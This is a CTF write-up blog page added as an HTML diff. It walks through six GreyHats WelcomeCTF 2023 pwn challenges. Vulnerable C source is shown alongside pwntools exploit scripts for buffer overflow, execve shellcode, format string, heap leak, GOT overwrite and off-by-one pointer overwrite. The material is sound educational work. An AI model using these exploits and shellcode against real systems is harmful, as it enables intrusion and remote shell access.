@@ -1,0 +1,443 @@
+<!doctypehtml>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>GreyHats WelcomeCTF 2023: Pwn</title>
+
+  <meta name="viewport"content="width=device-width,initial-scale=1">
+  <meta http-equiv="X-UA-Compatible"content="ie=edge">
+  <meta property="og:title"content="uhg's corner">
+  <meta property="og:image"content="https://i.ibb.co/4pRxk6j/trashthumbsup-c-websitethumb.png">
+  <meta property="og:description"content="vulnerability resarch, exploits and cve, ctf blog">
+  <meta property="og:url"content="https://ultimatehg.github.io">
+  <meta property="og:image:width"content="1200">
+  <meta property="og:image:height"content="627">
+  <meta property="og:type"content="website"> 
+
+  <link rel="shortcut icon"href="../assets/favicon.ico"type="image/x-icon">
+  <link rel="preload"href="../styles/article.css"as="style">
+  <link rel="stylesheet"href="../styles/article.css">
+</head>
+<body>
+  <header id="top-container"role="navigation">
+    <nav>
+  <a class="logo-link"href="/">
+    <h1>uhg's corner</h1>
+    <span>ctf_writeups | security_research | cs_stuff</span>
+  </a>
+  <small>
+    <a id="about"class="info-link"href="/about.html">👀About</a> /
+    <a id="works"class="info-link"href="/works.html">🔥Works</a> /
+    <a id="articles"class="info-link"href="/articles.html">📚Articles</a>
+  </small>
+</nav>
+
+  </header>
+  <main id="main-container">
+    <article id="article-container">
+      <h1 id="article-title">
+        GreyHats WelcomeCTF 2023: Pwn
+      </h1>
+      
+        <h2 id="article-subtitle">
+          Derusting my Pwn
+        </h2>
+      
+      <time id="article-date">
+        2023.08.27
+      </time>
+      <section id="article-content-container">
+        <details><summary>Table of Contents</summary>
+<p><div class="table-of-contents"><ul><li><ul><li><a href="#foreword">Foreword</a></ul><li><a href="#scissorspaperpwn-%F0%9F%8D%BC-%7C-83-solves-50-pts">ScissorsPaperPwn 🍼 | 83 solves 50 pts</a><li><a href="#complete-me-%F0%9F%8D%BC-%7C-19-solves-460-pts">Complete Me 🍼 | 19 solves 460 pts</a><li><a href="#fsa-%F0%9F%8D%BC-%7C-19-solves-460-pts">fsa 🍼 | 19 solves 460 pts</a><li><a href="#filelen-%7C-15-solves-476-pts">filelen | 15 solves 476 pts</a><li><a href="#where-got-shell%3F-%7C-11-solves-488-pts">Where GOT shell? | 11 solves 488 pts</a><li><a href="#mew-%7C-6-solves-497-pts">mew | 6 solves 497 pts</a><li><a href="#conclusion">Conclusion</a><li><a href="#afterword">Afterword</a></ul></div><p></p>
+</details>
+<h2 id="foreword"tabindex="-1">Foreword</h2>
+<p>Yes, I’m alive. It’s been 2 years but I’m back, finally. And I’m in school again which means my brain will be restarting after the past 2 years of brain rot serving National Service. What better way to relight the light blub in my head than to do a fun and (generally) easier CTF like the Greyhats WelcomeCTF which is designed for beginners and (somewhat) experienced players. I will just cover all the pwn challenges that I managed to clear in here, and if there’re any other misc challenges or challenges from other categories that I feel like writing about I’ll probably make a separate post about them. I’m following Greyhats’ convention: 🍼 emoji means the challenge is meant to be easy. Disclaimer before yall start reading, my solutions are in no way elegant, please go easy on me yeah… (challenge setters if you’re reading this, please forgive me if I did not use your intended solution)</p>
+<h1 id="scissorspaperpwn-%F0%9F%8D%BC-%7C-83-solves-50-pts"tabindex="-1">ScissorsPaperPwn 🍼 | 83 solves 50 pts</h1>
+<p>Starting off nice and easy is ScissorsPaperPwn. The source code is provided, and upon opening up it seems like a simple CLI game-styled challenge. It’s a game of scissors paper stone, but the computer is programmed to always win. The goal is to win this game and the flag would be given to us. The most important function, main() is as shown below:</p>
+<pre class="hljs"><code><span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>];
+<span class="hljs-type">int</span> score = <span class="hljs-number">0</span>, result;
+<span class="hljs-type">int</span> playerChoice, aiChoice;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+    init();
+
+    <span class="hljs-keyword">while</span> (score &lt; <span class="hljs-number">10</span>) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Current score: %d\n&quot;</span>, score);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Choose:\n&quot;</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0: Scissors\n&quot;</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1: Paper\n&quot;</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2: Stone\n&quot;</span>);
+
+        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);
+        gets(buf);
+        playerChoice = atoi(buf);
+        aiChoice = generateAIChoice(playerChoice);
+
+        <span class="hljs-keyword">if</span> (aiChoice &lt; <span class="hljs-number">0</span>) {
+            <span class="hljs-keyword">continue</span>;
+        }
+
+        result = getResult(playerChoice, aiChoice);
+        <span class="hljs-keyword">switch</span> (result) {
+            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-comment">// Draw</span>
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Draw!\n\n&quot;</span>);
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">// Win</span>
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You win! How??\n\n&quot;</span>);
+                score++;
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>: <span class="hljs-comment">// Lose</span>
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You lose! Ha &gt;:)\n\n&quot;</span>);
+                <span class="hljs-keyword">break</span>;
+        }
+    }
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You win! How did you even %d points?!?\n&quot;</span>, score);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;As promised, here is the flag:\n&quot;</span>);
+    <span class="hljs-built_in">printf</span>(FLAG);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>It’s immediately obvious that the vulnerable function here is <code>gets(buf)</code> which doesn’t do any checks, allowing us to attack it via buffer overflow. The size of the buffer is 32 bytes. Honestly speaking, I don’t think there’s much to go into for this one because the moment I opened up GDB to test out a basic overflow <code>'a'*33</code>, it caused the while loop to break due to the 1 byte overflow and the code reached this portion:</p>
+<pre class="hljs"><code><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You win! How did you even %d points?!?\n&quot;</span>, score);
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;As promised, here is the flag:\n&quot;</span>);
+<span class="hljs-built_in">printf</span>(FLAG);
+</code></pre>
+<p>I tested the same solution on the host and it gave me the flag.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+r = remote(<span class="hljs-string">&quot;34.87.186.254&quot;</span>,<span class="hljs-number">21212</span>)
+payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">33</span>
+r.sendline(payload)
+r.recvuntil(<span class="hljs-string">b&#x27;here is the flag:&#x27;</span>)
+r.recvline()
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag: &quot;</span>+r.recvline())
+r.close()
+</code></pre>
+<p><img src="https://i.ibb.co/rpyTS4j/scissorspaperpwn1.png"alt=""loading="lazy"decoding="async"></p>
+<p>Flag: <code>greyhats{Game_hacker_in_the_making?}</code></p>
+<p>Sweet and simple, the purest form of pwn. Have a picture of a cute cat as a bonus :)</p>
+<p><img src="https://d2zp5xs5cp8zlg.cloudfront.net/image-78260-800.jpg"alt=""loading="lazy"decoding="async"></p>
+<h1 id="complete-me-%F0%9F%8D%BC-%7C-19-solves-460-pts"tabindex="-1">Complete Me 🍼 | 19 solves 460 pts</h1>
+<p>This challenge was interesting but also pretty easy to tackle. Similarly, the source code and an ELF has been provided:</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+
+	setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);
+	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);
+
+	<span class="hljs-type">void</span> (*print_flag)(<span class="hljs-type">void</span>);
+	<span class="hljs-type">char</span>* code = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">7</span>, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
+	print_flag = (<span class="hljs-type">void</span>(*)(<span class="hljs-type">void</span>))code;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The flag is: &quot;</span>);
+	fgets(code, <span class="hljs-number">0x1000</span>, <span class="hljs-built_in">stdin</span>);
+	print_flag();
+
+}
+</code></pre>
+<p>This is literally just a program that would take your inputted bytes, place them into memory and then execute it. There are no checks, no traps, nothing that can really be seen here. So let’s just try sending shellcode via our input:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+r = remote(<span class="hljs-string">&quot;34.87.186.254&quot;</span>,<span class="hljs-number">21238</span>)
+
+shellcode = <span class="hljs-string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span>
+
+r.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)
+r.sendline(shellcode)
+r.interactive()
+</code></pre>
+<p>Yes, I just used some old shellcode I had lying around. There’s also the “cleaner” way of doing this by making use of pwntools:</p>
+<pre class="hljs"><code>shellcode = asm(pwnlib.shellcraft.amd64.linux.sh())
+</code></pre>
+<p>Or if you wanted to flex:</p>
+<pre class="hljs"><code>shellcode = asm(<span class="hljs-string">&quot;&quot;&quot;
+mov rax, 0x3b
+mov rbx, 0x68732f6e69622f
+push rbx
+mov rdi, rsp
+mov rsi, 0
+mov rdx, 0
+syscall
+&quot;&quot;&quot;</span>)
+</code></pre>
+<p>Either way, we input our shellcode and we pop a shell, after which we can simply <code>cat flag.txt</code> and bring it home.</p>
+<p><img src="https://i.ibb.co/qWwQN9X/completeme1.png"alt=""loading="lazy"decoding="async"></p>
+<p>Flag: <code>greyhats{y0u_4r3_4n_4553mb1y_pr0}</code></p>
+<h1 id="fsa-%F0%9F%8D%BC-%7C-19-solves-460-pts"tabindex="-1">fsa 🍼 | 19 solves 460 pts</h1>
+<p>Good ol’ format string. Sourcecode <code>fma.c</code> is provided for this challenge and this is what we see inside:</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-type">char</span> flag[] = <span class="hljs-string">&quot;greyhats{REDACTED}&quot;</span>;
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Flag is at %p\nEnter your input: \n&quot;</span>, &amp;flag);
+    fgets(buffer, <span class="hljs-keyword">sizeof</span>(buffer), <span class="hljs-built_in">stdin</span>);
+    <span class="hljs-built_in">printf</span>(buffer);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+	setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);
+	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);
+    vulnerable_function();
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>We can see that the vulnerable function here is aptly named <code>vulnerable_function()</code> which has an unformatted <code>printf(buffer)</code>. This means we <code>printf()</code> will effectively execute whatever format string we pass it. We can also see that the pointer to the flag would be printed for us in the first line before it asks for our input. We now pretty much have all the pieces of the puzzle should nothing else go wrong.</p>
+<p>The first step usually to any format string is I’d try to check how far down the stack my input variables are being stored. We first do a simple input to find out more about our leakable stack:</p>
+<p><img src="https://i.ibb.co/tDYBB1d/fsa1.png"alt=""loading="lazy"decoding="async"></p>
+<p>We can see that starting from the 6th item it is already regurgitating what we’re passing to it. Let’s clean it up a bit as a mini proof-of-concept:</p>
+<p><img src="https://i.ibb.co/5hmN9fS/fsa2.png"alt=""loading="lazy"decoding="async"></p>
+<p>Perfect. Now all we need to do is to grab the flag address that is given to us, feed it to the app and let format string bring home the flag for us.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+r = remote(<span class="hljs-string">&quot;34.87.186.254&quot;</span>,<span class="hljs-number">25236</span>)
+
+r.recvuntil(<span class="hljs-string">&quot;at &quot;</span>)
+payload = p32(<span class="hljs-built_in">int</span>(r.recvline().rstrip(<span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-number">0</span>))
+payload += <span class="hljs-string">&quot;%6$s&quot;</span>
+
+r.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)
+r.sendline(payload)
+r.recvuntil(<span class="hljs-string">&quot;greyhats&quot;</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag: greyhats&quot;</span>+r.recvline())
+</code></pre>
+<p><img src="https://i.ibb.co/6gSWd64/fsa3.png"alt=""loading="lazy"decoding="async"></p>
+<p>Flag: <code>greyhats{f0rmAt_5trin9_vuln3rabi1ities_4r3_d4ngerous}</code></p>
+<h1 id="filelen-%7C-15-solves-476-pts"tabindex="-1">filelen | 15 solves 476 pts</h1>
+<p>This is where the challenges start to require some looking into. We are provided with the sourcecode and a binary. The following is the <code>main()</code> function:</p>
+<pre class="hljs"><code><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+	<span class="hljs-type">char</span> file_name[<span class="hljs-number">0x50</span>];
+	init();
+
+	<span class="hljs-comment">// measure file</span>
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Which file do you want to measure?\n&gt; &quot;</span>);
+	read(<span class="hljs-number">0</span>, file_name, <span class="hljs-number">0x50</span>);
+	<span class="hljs-type">char</span>* nl = <span class="hljs-built_in">strchr</span>(file_name, <span class="hljs-number">0xa</span>);
+	<span class="hljs-keyword">if</span> (nl)
+		*nl = <span class="hljs-number">0x0</span>;
+	measure(file_name);
+
+	<span class="hljs-comment">// get name</span>
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The file is %ldcm long!\n\n&quot;</span>, flag_len);
+	<span class="hljs-type">char</span>* name = get_name();
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Goodbye %s!\n&quot;</span>, name);
+}
+</code></pre>
+<p>We can see that the program would ask us for a file that we wanted to “measure”. Afterwards it would call the <code>get_name()</code> function, store a (presumably) string in <code>name</code> and <code>printf()</code> some stuff afterwards.</p>
+<p>Let’s take a look at <code>measure(file_name)</code> first.</p>
+<pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">measure</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name)</span> {
+	FILE *f = fopen(name, <span class="hljs-string">&quot;r&quot;</span>);
+	<span class="hljs-keyword">if</span> (f) {
+		fseek(f, <span class="hljs-number">0</span>, SEEK_END);
+		flag_len = ftell(f);
+		fclose(f);
+	}
+}
+</code></pre>
+<p>Simple enough. Open file with name matching provided string with read permissions, seek through the file and return the length of the file. We could theoretically ask for the length of, say, <code>flag.txt</code>, which would dump all its contents on the heap. The heap is never actually properly cleared due to it needing to be efficient. We will get back to this later.
+There’s one more function that we’re interested in, which is <code>get_name()</code>, and it is as such:</p>
+<pre class="hljs"><code><span class="hljs-type">char</span>* <span class="hljs-title function_">get_name</span><span class="hljs-params">()</span> {
+	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = <span class="hljs-number">0</span>;
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Btw what is your name?\n&quot;</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Length: &quot;</span>);
+	<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%u&quot;</span>, &amp;size);
+	<span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">1</span> || size &gt; <span class="hljs-number">0x100</span>) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid name length!&quot;</span>);
+		<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+	}
+	getchar();
+	<span class="hljs-type">char</span>* name = <span class="hljs-built_in">malloc</span>(size);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Name: &quot;</span>);
+	read(<span class="hljs-number">0</span>, name, size);
+	<span class="hljs-type">char</span>* nl = <span class="hljs-built_in">strchr</span>(name, <span class="hljs-number">0xa</span>);
+	<span class="hljs-keyword">if</span> (nl)
+		*nl = <span class="hljs-number">0x0</span>;
+	<span class="hljs-keyword">return</span> name;
+}
+</code></pre>
+<p>This function first asks for the length of your name, which is interesting to say the least. It makes sure that the length is not less than or equals to 1, and is not greater than 0x100. It then uses the <code>read(0, name, size)</code>. <code>read()</code> does not put a nullbyte at the end of the input. This means we could potentially cause an information leak with this. If the string that <code>read()</code> obtains does not have a nullbyte, the next <code>printf()</code> or <code>puts()</code> that is used to output the buffer would just keep going until it reaches a nullbyte. Recall in the <code>main()</code> function earlier the following code is used:</p>
+<pre class="hljs"><code><span class="hljs-type">char</span>* name = get_name();
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Goodbye %s!\n&quot;</span>, name);
+</code></pre>
+<p>Nice, let’s try something on the challenge host first.</p>
+<p><img src="https://i.ibb.co/CHRTSfH/filelen1.png"alt=""loading="lazy"decoding="async"></p>
+<p>Ok so we can dump <code>flag.txt</code> onto the heap. Since the variable <code>size</code> is passed to <code>read()</code>, we will just input, say, 100. And then we will pass an input with terminating nullbyte, and let the <code>printf()</code> sled run its way through.
+This is also explained quite well by <a href="https://github.com/Naetw/CTF-pwn-tips">Naetw’s</a> amazing cheatsheet on pwn challenges:</p>
+<p><img src="https://i.ibb.co/d7LTSVP/filelen2.png"alt=""loading="lazy"decoding="async"></p>
+<p>Ok let’s try out our concept:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+r = remote(<span class="hljs-string">&quot;34.87.186.254&quot;</span>,<span class="hljs-number">21235</span>)
+r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-string">&quot;flag.txt&quot;</span>)
+r.sendlineafter(<span class="hljs-string">&quot;Length: &quot;</span>, <span class="hljs-string">&quot;100&quot;</span>)
+r.sendafter(<span class="hljs-string">&quot;Name: &quot;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1</span>)
+r.recvuntil(<span class="hljs-string">&quot;Goodbye a&quot;</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag: g&quot;</span>+r.recvline())
+</code></pre>
+<p><img src="https://i.ibb.co/xGQhFYc/filelen3.png"alt=""loading="lazy"decoding="async"></p>
+<p>And there’s our flag.</p>
+<p>Flag: <code>greyhats{th3_fl4g_w4s_fr33_bu7_y0u_br0ught_1t_b4ck_bY_h34p_r3us3!}</code></p>
+<h1 id="where-got-shell%3F-%7C-11-solves-488-pts"tabindex="-1">Where GOT shell? | 11 solves 488 pts</h1>
+<p>From the name, I kinda assumed that it was a GOT table rewrite. This time round only the binary is provided to us, the source code isn’t provided. Let’s run the program to see what it does:</p>
+<p><img src="https://i.ibb.co/7tKpsKV/wheregotshell1.png"alt=""loading="lazy"decoding="async"></p>
+<p>Ok this program seems to just take whatever address we pass it and directly write to said address. We can run a quick <code>checksec</code> on the binary to see if it has any protections.</p>
+<p><img src="https://i.ibb.co/Bnrm8Lq/wheregotshell2.png"alt=""loading="lazy"decoding="async"></p>
+<p>Partial RELRO, no canary, no PIE. That means that whatever addresses that I get, I get to use. Nice. Since this already set itself up as a GOT rewrite, I’m looking out for the function that I can overwrite as well as the function that I will overwrite with. Let’s fire up IDA.</p>
+<p><img src="https://i.ibb.co/QffC686/wheregotshell3.png"alt=""loading="lazy"decoding="async"></p>
+<p>Roughly we can see that the program basically runs <code>scanf()</code> for <code>%lx</code>, <code>scanf()</code> for <code>%lx</code> again, then write the second input into the first input address. Pretty straight forward. Let’s look at the function table.</p>
+<p><img src="https://i.ibb.co/5L9cFBC/wheregotshell4.png"alt=""loading="lazy"decoding="async"></p>
+<p>There is a <code>win()</code> function at <code>0x401176</code>. The <code>win()</code> function will give us the flag:</p>
+<p><img src="https://i.ibb.co/17QT33S/wheregotshell5.png"alt=""loading="lazy"decoding="async"></p>
+<p>Ok. Now we have the pieces in place. We can see earlier in the <code>main()</code> function that a final <code>puts(&quot;Okay, exiting now...\n&quot;);</code> is called at the end before the program exits. This means theoretically we could use the 2 inputs to overwrite <code>puts()</code> in the GOT with the address of <code>win()</code>, then as the program exits, <code>win()</code> would be called. Let’s try out our theory:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+e = context.binary = ELF(<span class="hljs-string">&quot;./got_shell&quot;</span>)
+
+puts = <span class="hljs-built_in">hex</span>(e.got.puts).lstrip(<span class="hljs-string">&quot;0x&quot;</span>)
+
+win_addr = <span class="hljs-string">&quot;401176&quot;</span>
+
+r = remote(<span class="hljs-string">&quot;34.87.186.254&quot;</span>,<span class="hljs-number">26879</span>)
+
+r.recvline()
+r.recvline()
+r.sendline(puts)
+r.recvline()
+r.sendline(win_addr)
+r.recvline()
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag: &quot;</span>+r.recvuntil(<span class="hljs-string">&quot;}&quot;</span>))
+r.close()
+</code></pre>
+<p>We run our code and voila,</p>
+<p><img src="https://i.ibb.co/gyTDCCL/wheregotshell6.png"alt=""loading="lazy"decoding="async"></p>
+<p>We obtained the flag.</p>
+<p>Flag: <code>greyhats{G0t_C4nc3r_y3T?_ad8123fa}</code></p>
+<h1 id="mew-%7C-6-solves-497-pts"tabindex="-1">mew | 6 solves 497 pts</h1>
+<p>The final challenge that I solved is a lot more complex that the previous few, at least to me. This one is a C++ challenge, which made it slightly more annoying to do. We are provided the source code, binary and makefile of the challenge. Let’s take a look at our source code first. From a glance, it looks like a simple calculator as the challenge describes itself, with 5 options: read a number, write a number, sort numbers, re-initiate running mean and print statistics (running mean). Read/write a number would just accept an index input followed by an integer input. It’s worthy to note that the code was handled this way:</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSZ 100</span>
+
+...
+
+<span class="hljs-type">int</span> index; num value;
+std::cout &lt;&lt; <span class="hljs-string">&quot;Enter index: &quot;</span>;
+std::cin &gt;&gt; index;
+<span class="hljs-keyword">if</span> (index &gt;= MAXSZ || index &lt; <span class="hljs-number">0</span>) {
+    std::cout &lt;&lt; <span class="hljs-string">&quot;Bad index!&quot;</span> &lt;&lt; std::endl;
+    <span class="hljs-keyword">continue</span>;
+}
+std::cout &lt;&lt; <span class="hljs-string">&quot;Enter value: &quot;</span>;
+std::cin &gt;&gt; value;
+ARR[index] = value;
+</code></pre>
+<p>It does a direct cast of <code>std::cin</code> input to an integer variable <code>value</code> without any error handling, which means that we would not be allowed to input any non-integers lest we be sent into an infinite loop. While scouring through the code, I noticed this interesting thing in the <code>sort()</code> function.</p>
+<pre class="hljs"><code><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> num;
+
+<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(num* arr, num len)</span> </span>{
+    num tmp = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span>(num i = <span class="hljs-number">0</span>; i &lt;= len; i++) {
+        <span class="hljs-keyword">for</span>(num j = i; j &lt;= len; j++) {
+            <span class="hljs-keyword">if</span> (arr[i] &lt; arr[j]) <span class="hljs-keyword">continue</span>;
+            tmp = arr[i];
+            arr[i] = arr[j];
+            arr[j] = tmp;
+        }
+    }
+}
+</code></pre>
+<p>It loops until <code>&lt;= len</code>, instead of <code>&lt; len</code>. But in our <code>main()</code> function when <code>sort()</code> is called, the following is passed to <code>sort()</code>.</p>
+<pre class="hljs"><code><span class="hljs-built_in">sort</span>(ARR, MAXSZ);
+</code></pre>
+<p>Now this is interesting. As we saw above, <code>MAXSZ</code> is defined as 100, which <strong>is the size of the array!</strong> This means that if we sorted the array with these variables, we could potentially access an object on the stack at arr[100] if, say, said object is sorted into the array and our in-array object is sorted to index 100. Since arrays work just like pointers to the memory, this is definitely possible.</p>
+<p>I wanted to test a proof of concept, so I entered an incredibly big number (16 digts) <code>9999999999999999</code> into the array and called the <code>sort()</code> function. When I looked at index 99 of the array afterwards, sure enough:</p>
+<p><img src="https://i.ibb.co/3hysgYL/mew1.png"alt=""loading="lazy"decoding="async"></p>
+<p>But what is this mysterious value that I managed to obtain? If we convert the number to base 16, we get the following “number” <code>7ffee0b67d68</code>. Now this looks suspiciously like a pointer to a function to me, so I fired up gef to play around. This is what happens if we do the above and then select “Statistics” on the calculator, which would make a call to <code>running_mean</code>.</p>
+<p><img src="https://i.ibb.co/PGvz0yS/mew2.png"alt=""loading="lazy"decoding="async"></p>
+<p>A segfault in the application occurs. It seems like the location that I overwrote at <code>*arr+100</code> was affecting program execution when it tried to <code>mov rcx, QWORD PTR[rax]</code> after calling <code>running_mean()</code>. This is interesting because we can show the registers at this point of time:</p>
+<p><img src="https://i.ibb.co/5GVgRmn/mew3.png"alt=""loading="lazy"decoding="async"></p>
+<p>When we convert the address of the <code>rax</code> register to decimal, we get back <code>9999999999999999</code>, which was the number we inputted! This means that our concept worked and sorting the array with a value larger than <code>7ffee0b67d68</code> would replace <code>7ffee0b67d68</code> with our desired pointer. I then tried to see what would happen if I just passed along the address of <code>win()</code>, which we can find with <code>disassem win</code> in gdb.</p>
+<p><img src="https://i.ibb.co/3smHfX1/mew4.png"alt=""loading="lazy"decoding="async"></p>
+<p>We convert <code>0x5555555553f4</code> (at the very beginning of the <code>system()</code> call where <code>/bin/sh</code> is first loaded into a register) to decimal to get <code>93824992236532</code>, and we replace our input with this to see if it does anything.</p>
+<p><img src="https://i.ibb.co/nBv4SDQ/mew5.png"alt=""loading="lazy"decoding="async"></p>
+<p>Another segfault. This time the address changed. It’s trying to access the address <code>0x5555aaaab22a</code>. Hmm, at this point I was thinking it could be an offset issue. So I found the offset between the 2 pointers which in this case was <code>0x55555e36</code>, and then I subtracted this offset from my input address. This gave me a new input value of <code>93823560578494</code>. I then substituted this value and tested again.</p>
+<p><img src="https://i.ibb.co/swzjG6j/mew6.png"alt=""loading="lazy"decoding="async"></p>
+<p>I spawned shell! Now all that I need to do is to clean up the process and try it on the host machine. I would access shell then simply <code>cat flag.txt</code> for the flag.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+r = remote(<span class="hljs-string">&quot;34.87.186.254&quot;</span>,<span class="hljs-number">24985</span>)
+
+win_input = <span class="hljs-string">&quot;93823560578494&quot;</span>
+
+<span class="hljs-comment"># input win() address</span>
+r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)
+r.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)
+r.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,win_input)
+<span class="hljs-comment"># call sort</span>
+r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)
+<span class="hljs-comment"># call statistics</span>
+r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;5&quot;</span>)
+r.recvline()
+<span class="hljs-comment"># home free</span>
+r.sendline(<span class="hljs-string">&quot;cat flag.txt&quot;</span>)
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag: &quot;</span>+r.recvuntil(<span class="hljs-string">&quot;}&quot;</span>))
+r.close()
+</code></pre>
+<p>And just as expected</p>
+<p><img src="https://i.ibb.co/f1C1mSH/mew7.png"alt=""loading="lazy"decoding="async"></p>
+<p>The flag is in front of us.</p>
+<p>Flag: <code>greyhats{mewtwo_19211231}</code></p>
+<h1 id="conclusion"tabindex="-1">Conclusion</h1>
